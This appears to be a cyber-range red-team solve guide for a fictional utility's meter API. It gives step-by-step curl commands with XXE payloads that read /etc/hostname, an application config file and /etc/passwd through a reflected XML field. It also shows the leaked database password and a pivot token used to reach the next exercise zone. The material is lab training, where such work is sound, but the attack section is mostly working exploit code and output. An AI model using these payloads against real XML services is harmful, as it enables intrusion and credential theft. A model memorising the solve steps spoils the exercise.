# Red Team Solve Guide — M4
## RNG-EXT-01 | M4-ext-meter-api | XXE in SOAP Meter API → Config File Read
**Technique:** T1005 — Data from Local System (via XXE/SSRF)  
**Pivot In:** API Key `soap-9f3b2d1e7a8c4f6d` (from M3 admin panel)  
**Pivot Out:** `vs-corp-7g9h2j4k6n2m` (Corporate Zone pivot token) → RNG-CORP-01 M1

---

## Objective
The BUNL Meter Data Exchange API parses submitted XML without disabling external entity resolution. Inject a DOCTYPE with a SYSTEM entity referencing the application config file — the entity value is reflected back in the API response, leaking database credentials and the corporate zone pivot token.

---

## Step 1 — Discover the API

```bash
curl -s http://203.x.x.x:8000/api/meter/health
# {"status": "ok", "service": "BUNL Meter Data Exchange API", "version": "2.0.1"}

# Schema requires API key
curl -s -H "X-API-KEY: soap-9f3b2d1e7a8c4f6d" \
  http://203.x.x.x:8000/api/meter/schema
# Returns XSD schema — MeterId, ReadingValue, ReadingDate, MeterType
```

---

## Step 2 — Confirm the XXE Vulnerability

Send a normal valid payload first:
```bash
curl -s -X POST http://203.x.x.x:8000/api/meter/submit \
  -H "X-API-KEY: soap-9f3b2d1e7a8c4f6d" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><MeterDataSubmission><MeterId>MTR-TEST-001</MeterId><ReadingValue>312</ReadingValue></MeterDataSubmission>'
# Response contains <MeterId>MTR-TEST-001</MeterId> — MeterId is reflected in response
```

Now inject an XXE entity — the MeterId is reflected so it becomes the exfiltration channel:
```bash
curl -s -X POST http://203.x.x.x:8000/api/meter/submit \
  -H "X-API-KEY: soap-9f3b2d1e7a8c4f6d" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<MeterDataSubmission>
  <MeterId>&xxe;</MeterId>
  <ReadingValue>1</ReadingValue>
</MeterDataSubmission>'
```

Response:
```xml
<MeterId>bunl-meter-01</MeterId>
```

XXE confirmed — `/etc/hostname` is reflected in the `<MeterId>` field.

---

## Step 3 — Read the Application Config File

```bash
curl -s -X POST http://203.x.x.x:8000/api/meter/submit \
  -H "X-API-KEY: soap-9f3b2d1e7a8c4f6d" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/bunl/meter-api/config.ini">]>
<MeterDataSubmission>
  <MeterId>&xxe;</MeterId>
  <ReadingValue>1</ReadingValue>
</MeterDataSubmission>' | grep -A 50 "<MeterId>"
```

Response (MeterId contains the full config.ini):
```
[bunl_meter_api]
environment = production
...
[database]
db_host = db-01.bunl-internal.net
db_pass = Mtr@BunlDB!2025
...
[pivot]
corp_pivot_token = vs-corp-7g9h2j4k6n2m
corp_zone_entry = Corporate Zone M1 — BUNL HR System (DISHA)
```

---

## Step 4 — Additional File Read (bonus)

```bash
# Read /etc/passwd to enumerate system users
curl -s -X POST http://203.x.x.x:8000/api/meter/submit \
  -H "X-API-KEY: soap-9f3b2d1e7a8c4f6d" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE f[<!ENTITY x SYSTEM "file:///etc/passwd">]><MeterDataSubmission><MeterId>&x;</MeterId><ReadingValue>1</ReadingValue></MeterDataSubmission>'
```

---

## Summary

| Item | Value |
|---|---|
| Vulnerability | XXE via unsanitised XML parser (CWE-611) |
| Exfil Channel | `<MeterId>` field reflected in API response |
| Config File | `/opt/bunl/meter-api/config.ini` |
| Credential Obtained | Corp pivot token: `vs-corp-7g9h2j4k6n2m` |
| Next Zone | RNG-CORP-01 M1 — BUNL HR System DISHA |
| MITRE | T1005 |
